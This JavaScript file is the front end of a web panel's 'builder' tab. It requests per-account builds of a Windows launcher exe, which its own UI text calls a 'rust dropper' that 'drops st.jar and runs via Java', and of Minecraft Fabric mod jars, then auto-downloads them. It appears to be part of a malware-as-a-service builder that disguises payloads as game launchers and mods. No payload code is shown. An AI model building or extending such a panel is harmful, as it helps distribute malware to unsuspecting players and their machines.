// language: JavaScript, file: public/js/builder.js
// builder tab — windows launcher + minecraft fabric mod.
// launcher deliverables are now raw .exe files (no padding).

(function () {
  'use strict';

  const $ = (id) => document.getElementById(id);

  function humanSize(n) {
    if (n < 1024) return `${n} B`;
    if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
    return `${(n / 1024 / 1024).toFixed(2)} MB`;
  }

  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
      '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
    }[c]));
  }

  // ---------- builds list (windows + minecraft) ----------

  async function loadBuilds() {
    const host = $('b-rows');
    if (!host) return;
    try {
      const r = await fetch('/api/builds', { credentials: 'same-origin' });
      if (!r.ok) return;
      const rows = await r.json();
      const count = $('b-count');
      if (count) count.textContent = `${rows.length} builds`;
      host.innerHTML = '';
      if (!rows || rows.length === 0) {
        host.innerHTML = '<div class="empty">no builds yet</div>';
        return;
      }
      rows.forEach(b => {
        const el = document.createElement('div');
        el.className = 'row';
        el.innerHTML = `
          <span class="dot on"></span>
          <span class="host">${esc(b.base || 'boot')}</span>
          <span class="ip">${humanSize(b.size)}</span>
          <span class="seen">${new Date(b.created_at).toLocaleString()}</span>
          <span class="actions">
            <button class="ghost mini" data-dl>download</button>
            <button class="ghost mini" data-del style="border-color:rgba(248,113,113,.35);color:var(--red)">delete</button>
          </span>`;
        el.querySelector('[data-dl]').addEventListener('click', (e) => {
          e.stopPropagation();
          if (b.base === 'minecraft') {
            window.location.href = `/api/builds/minecraft/${b.id}/download`;
          } else {
            window.location.href = `/api/builds/${b.id}/download`;
          }
        });
        el.querySelector('[data-del]').addEventListener('click', async (e) => {
          e.stopPropagation();
          if (!confirm(`delete build?`)) return;
          await fetch(`/api/builds/${b.id}`, { method: 'DELETE', credentials: 'same-origin' });
          loadBuilds();
        });
        host.appendChild(el);
      });
    } catch {}
  }

  // ---------- windows launcher build ----------

  async function doBuild() {
    const btn = $('b-build');
    const out = $('b-result');
    if (!btn || !out) return;

    const key = ($('b-key')?.value || '').trim();

    btn.disabled = true;
    btn.textContent = 'building…';
    out.innerHTML = '<div class="note">compiling rust dropper — takes about 30–60 seconds</div>';

    try {
      const r = await fetch('/api/build', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key }),
      });
      const d = await r.json().catch(() => ({}));

      if (!r.ok) {
        out.innerHTML = `<div class="err">${esc(d.error || ('build failed: ' + r.status))}</div>`;
      } else {
        out.innerHTML = `
          <div class="tile">
            <div class="k">build ready — exe download starting</div>
            <div class="v mono" style="font-size:13px;margin-top:8px">${esc(d.key)}</div>
            <div class="note" style="margin-top:8px">
              ${humanSize(d.size)} exe · drops st.jar and runs via Java
            </div>
            <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
              <button class="ghost mini" id="b-dl-now">download again</button>
            </div>
            <div class="note">live url: <code style="color:var(--accent);font-family:var(--mono)">/api/downloads/boot.exe</code></div>
          </div>`;

        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = d.url;
        document.body.appendChild(iframe);
        setTimeout(() => iframe.remove(), 30000);

        document.getElementById('b-dl-now')?.addEventListener('click', () => {
          window.location.href = d.url;
        });
        loadBuilds();
      }
    } catch {
      out.innerHTML = '<div class="err">network error</div>';
    }

    btn.disabled = false;
    btn.textContent = 'build launcher';
  }

  function preloadAccountKey() {
    const keyField = $('b-key');
    if (!keyField || keyField.value) return;

    const fromAcct = document.getElementById('a-akey')?.textContent;
    if (fromAcct && fromAcct !== '—') { keyField.value = fromAcct; return; }

    const fromOv = document.getElementById('ov-akey')?.textContent;
    if (fromOv && fromOv !== '—') { keyField.value = fromOv; return; }

    fetch('/api/me', { credentials: 'same-origin' })
      .then(r => r.ok ? r.json() : null)
      .then(me => { if (me?.accountKey) keyField.value = me.accountKey; })
      .catch(() => {});
  }

  // ---------- minecraft fabric build ----------

  let mcPollTimer = null;
  let mcPollBuildId = null;

  function stopMcPoll() {
    if (mcPollTimer) { clearInterval(mcPollTimer); mcPollTimer = null; }
  }

  function paintMcProgress(p) {
    const wrap = $('mc-progress');
    const bar  = $('mc-bar');
    const step = $('mc-step');
    const pct  = $('mc-pct');
    if (!wrap || !bar) return;
    wrap.style.display = 'block';
    bar.style.width = `${Math.max(0, Math.min(100, p.pct || 0))}%`;
    if (step) step.textContent = p.step || 'working…';
    if (pct)  pct.textContent  = `${Math.round(p.pct || 0)}%`;
    if (p.step === 'failed') bar.style.background = 'var(--red)';
    else if (p.pct >= 100)   bar.style.background = 'var(--green)';
    else                     bar.style.background = 'var(--accent)';
  }

  async function pollMcProgress() {
    if (!mcPollBuildId) return;
    try {
      const r = await fetch(`/api/build/minecraft/progress/${mcPollBuildId}`, { credentials: 'same-origin' });
      if (!r.ok) return;
      const p = await r.json();
      paintMcProgress(p);
      if (p.pct >= 100 && p.step === 'done') {
        stopMcPoll();
        const out = $('mc-result');
        if (out) out.innerHTML = `
          <div class="tile" style="margin-top:16px">
            <div class="k">minecraft mod ready</div>
            <div class="v mono" style="font-size:13px;margin-top:8px">${esc(p.jarName || '')}</div>
            <div class="note" style="margin-top:8px">${humanSize(p.jarSize || 0)} · drop in <code style="font-family:var(--mono)">.minecraft/mods</code></div>
            <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
              <button class="ghost mini" id="mc-dl-now">download .jar</button>
            </div>
          </div>`;
        document.getElementById('mc-dl-now')?.addEventListener('click', () => {
          window.location.href = p.downloadUrl;
        });
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = p.downloadUrl;
        document.body.appendChild(iframe);
        setTimeout(() => iframe.remove(), 30000);

        const btn = $('mc-build');
        if (btn) { btn.disabled = false; btn.textContent = 'build .jar'; }
        loadBuilds();
      } else if (p.step === 'failed') {
        stopMcPoll();
        const out = $('mc-result');
        if (out) out.innerHTML = `<div class="err" style="margin-top:16px">build failed: ${esc(p.error || 'unknown')}</div>`;
        const btn = $('mc-build');
        if (btn) { btn.disabled = false; btn.textContent = 'build .jar'; }
      }
    } catch {}
  }

  async function doMcBuild() {
    const btn = $('mc-build');
    const out = $('mc-result');
    if (!btn || !out) return;

    btn.disabled = true;
    btn.textContent = 'building…';
    out.innerHTML = '';
    paintMcProgress({ pct: 0, step: 'queued' });

    const target = ($('mc-version')?.value || '1.21.1').trim();
    const loaderRange = ($('mc-loader')?.value || '>=0.15.0').trim();

    try {
      const r = await fetch('/api/build/minecraft', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, loaderRange }),
      });
      const d = await r.json().catch(() => ({}));
      if (!r.ok) {
        out.innerHTML = `<div class="err" style="margin-top:16px">${esc(d.error || ('build failed: ' + r.status))}</div>`;
        btn.disabled = false; btn.textContent = 'build .jar';
        return;
      }
      mcPollBuildId = String(d.buildId);
      stopMcPoll();
      mcPollTimer = setInterval(pollMcProgress, 1000);
      pollMcProgress();
    } catch {
      out.innerHTML = '<div class="err" style="margin-top:16px">network error</div>';
      btn.disabled = false; btn.textContent = 'build .jar';
    }

    setTimeout(() => {
      if (btn.disabled) { btn.disabled = false; btn.textContent = 'build .jar'; }
    }, 5 * 60 * 1000);
  }

  // ---------- boot ----------

  function boot() {
    if (!$('b-key')) return;
    if (window.__builderBooted) return;
    window.__builderBooted = true;

    preloadAccountKey();

    const buildBtn = $('b-build');
    if (buildBtn) buildBtn.addEventListener('click', doBuild);

    const mcBtn = $('mc-build');
    if (mcBtn) mcBtn.addEventListener('click', doMcBuild);

    loadBuilds();

    const navBuilder = document.querySelector('.nav a[data-tab="builder"]');
    if (navBuilder) {
      navBuilder.addEventListener('click', () => {
        setTimeout(() => { preloadAccountKey(); loadBuilds(); }, 0);
      });
    }

    window.__builderResumeMc = () => {
      if (mcPollBuildId && !mcPollTimer) {
        mcPollTimer = setInterval(pollMcProgress, 1000);
        pollMcProgress();
      }
    };
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }
})();